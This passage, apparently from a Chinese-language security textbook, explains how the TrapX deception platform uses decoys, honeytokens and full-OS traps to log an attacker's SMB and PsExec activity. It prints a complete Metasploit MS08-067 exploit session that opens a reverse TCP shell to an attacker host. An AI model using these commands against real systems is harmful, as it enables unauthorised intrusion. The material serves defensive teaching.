

## 攻击亮点

主机名: 10.0.0.162
IP 地址: 10.0.0.162
端口: 3210
登录: cyber\user (SMB1)
开始时间戳: 29/06/2017 14:49:57
结束时间戳: 29/06/2017 14:52:57

### SMB 445
名称: GothamFinancial3_MT
IP 地址: 10.0.0.16
仿真类型: Windows 工作站
操作系统: Microsoft Windows 7

- 登录: 4
- 文件: 4
- 进程: 4
- 服务: 1
- 连接: 4

### 文件

- PSEXESVC.exe 87dfa38f5776f5f20724455e8832a8
- file.exe c67e2af589b417e720c6c11e47a03f

### 攻击详情

| 时间 | 描述 |
|---|---|
| 14:49:57 | 登录: cyber\user (SMB1) |
| 14:49:57 | 连接: \\10.0.0.16\ADMIN$ |
| 14:49:57 | 连接: \\10.0.0.16\IPC$ |
| 14:49:57 | 连接: \\10.0.0.16\C$ |
| 14:49:57 | 目录: C:\* |
| 14:49:57 | 删除目录: C:\folder1 |
| 14:49:57 | AT 执行: id 2, zoom.exe |
| 14:49:57 | AT 列表: |
| 14:49:57 | 创建文件: C:\windows\PSEXESVC.exe |
| 14:49:57 | 创建服务: 服务名称: PSEXESVC, 二进制路径: %SystemRoot%\PSEXESVC.exe |
| 14:49:57 | 创建文件: C:\windows\file.exe |

### 静态分析

注意攻击者如何启动 PSEXEC 服务并创建文件 (file.exe)。您可以在沙箱报告中查看该文件的动态分析，该报告包括行为、网络活动、进程、取证物、注册表项活动和文件系统活动。

![](img/5f597c6a70133069118d9e804ace3775_605_0.png)

此外，如下所示，您可以查看该文件的静态和声誉分析。

| 属性 | 值 |
|---|---|
| 文件大小 | 189792 |
| 文件类型 | PE32 executable (console) Intel 80386, for MS Windows |
| 文件 MD5 | 87dfac39517f652072445e58e83248 |
| 文件 SHA1 | 0c5a4a6c11f19a6d622684d46c50fc139f5e954ff |
| 文件 ssdeep | 3072:G075Rm11WpS8qOQew7EMk0qnPILyfgylgBERDFDE0ca0nKu++xQQ950Pm58fnKWLTfYOBQI3u+sQ |
| 文件日期 | 0x533888A1 [Sun Mar 30 20:50:41 2014 UTC] |
| 文件 EP | 0x40985c: text 0/4 |
| 外出连接 | N/A |
| 文件 CRC | 声明: 0x379bab, 实际: 0x379bab |
| 文件加壳工具 | N/A |
| TLS 回调 | N/A |
| 可疑警报 | StartServiceCtrlDispatcherW<br>CreateProcessAsUserW<br>OpenProcessToken<br>StartServiceW<br>CreateServiceW |
| 版本信息 | LegalCopyright: Copyright \x9a 2001-2014 Mark Russinovich InternalName: PsExec Service Host FileVersion: 2.11 CompanyName: Sysinternals ProductName: Sysinternals P... |
| AV 参考 | N/A / N/A |

真正有趣的地方在于，当使用 TrapX 模拟 SMB 命令并允许攻击者利用诱饵系统时，TrapX 会监控和控制这些命令的影响。

```
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 192.168.100.133
RHOST => 192.168.100.133
msf exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 192.168.100.12
LHOST => 192.168.100.12
msf exploit(ms08_067_netapi) > set target 4
target => 4
msf exploit(ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 192.168.100.12:4444
[*] 192.168.100.133:445 - Attempting to trigger the vulnerability...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.100.133
[*] Command shell session 1 opened (192.168.100.12:4444 -> 192.168.100.133:54087) at 2017-08-28 23:41:37 -0500

C:>dir
Volume in drive C has no label.
Volume Serial Number is BC23-2A69

Directory of C:\\

09/24/2015  10:21 AM    <DIR>          0 AUTOEXEC.BAT
09/24/2015  10:18 AM             210 boot.ini
09/24/2015  10:21 AM    <DIR>          0 CONFIG.SYS
08/18/2017  01:43 PM    <DIR>            data
09/24/2015  09:31 AM    <DIR>   Documents and Settings
09/24/2015  10:21 AM    <DIR>          0 IO.SYS
09/24/2015  10:21 AM    <DIR>          0 MSDOS.SYS
03/25/2005  06:00 AM            47,772 NTDETECT.COM
03/25/2005  06:00 AM           295,536 ntldr
09/24/2015  09:33 AM       1,610,612,736 pagefile.sys
09/24/2015  09:31 AM    <DIR>      Program Files
09/24/2015  10:25 AM    <DIR>      System Volume Information
08/18/2017  01:43 PM    <DIR>      testfordemo
09/24/2015  09:34 AM    <DIR>      Windows
09/24/2015  10:22 AM    <DIR>      wmpub
           8 File(s)   1,610,956,254 bytes
           7 Dir(s)  18,505,936,896 bytes free

C:>
```

除了 Linux 和 Windows 系统的经典诱饵之外，TrapX 还能模拟各种设备，例如 Juniper 和 Cisco 设备；各种医疗、物联网 (IOT) 和 SCADA 设备；以及 Swift 和 ATM 等金融服务。对于本实验，我们启用了一个 Cisco 交换机，如下所示，但请注意还有其他可用服务。

![](img/5f597c6a70133069118d9e804ace3775_608_0.png)

运行 Cisco 诱饵时，攻击者可以通过 SSH/Telnet 与 Cisco 命令行界面 (CLI) 交互。此外，诱饵会发送 Cisco 发现协议 (CDP) 数据包，这些数据包可能会吸引攻击者，并将其引导至与真实但虚假的 Web GUI 交互，如下所示。同样，对该虚假 GUI 采取的所有操作都会被记录，安全运营中心 (SOC) 分析师会收到警报。

![](img/5f597c6a70133069118d9e804ace3775_609_0.png)

此外，TrapX 可以与 Cisco 身份服务引擎 (ISE) 和 ForeScout 交互，使用网络访问控制 (NAC) 将可疑连接转移到隔离的欺骗网络中进行进一步分析。有关 TrapX 将 Wannacry 转移到隔离网络的视频链接，请参见本章末尾的“进一步阅读”部分。

TrapX 允许使用欺骗 (蜜罐) 令牌。例如，可以在主机（本例中为 fileserver004）上建立一个虚拟网络驱动器，如下所示。请注意，虚拟网络驱动器 (R:) 在桌面上对用户不可见；相反，只有攻击者在使用命令行工具时才能看到它，这正是攻击者通常的操作方式。另请注意，虚拟网络驱动器上会显示虚拟文件。

![](img/5f597c6a70133069118d9e804ace3775_610_0.png)

攻击者的所有操作都会在 SOC（虚拟共享映射到 C:\data）中追踪。

![](img/5f597c6a70133069118d9e804ace3775_611_0.png)

TrapX 还具有基于 Web 的欺骗令牌，提供三个级别的欺骗：

- 浏览器历史记录 看起来对攻击者有吸引力的假 URL
- 浏览器凭据 带有假保存用户名和密码的假 URL
- 浏览器书签 指向诱饵 Web 应用程序的假浏览器书签链接

所有这些信息都是可配置的；例如，此处显示了浏览器凭据。

![](img/5f597c6a70133069118d9e804ace3775_612_0.png)

此浏览器数据可能会诱使攻击者访问诱饵 Web 应用程序，如下所示。

![](img/5f597c6a70133069118d9e804ace3775_612_1.png)

回到 SOC 中，分析师会收到警报，如下所示，因为不应该有人连接到此站点。

![](img/5f597c6a70133069118d9e804ace3775_613_0.png)

TrapX 最先进的功能之一是能够安全地将命令代理到完整的操作系统，提供尽可能高的模拟级别。TrapX 将此称为完整操作系统 (FOS) 诱饵。例如，攻击者可能使用钓鱼电子邮件获得立足点，然后发现有意放置的指向运行远程桌面协议 (RDP) 的文件共享的欺骗令牌信息。攻击者甚至可能运行 Mimikatz，如下所示，以为自己正在获取真实凭据。

![](img/5f597c6a70133069118d9e804ace3775_613_1.png)

如下所示，攻击者随后可能使用这些被盗凭据与该完整但虚假的系统建立 RDP 会话，该系统的唯一目的是被访问并向 SOC 分析师提供警报，这与我们早先对蜜罐的定义相符。

![](img/5f597c6a70133069118d9e804ace3775_614_0.png)

攻击者可能不知道这是一个蜜罐，因为它是一个完整的操作系统，可能认为自己对系统拥有完全访问权限。然而，他们正处在 SOC 团队的严密监视之下，如下所示。

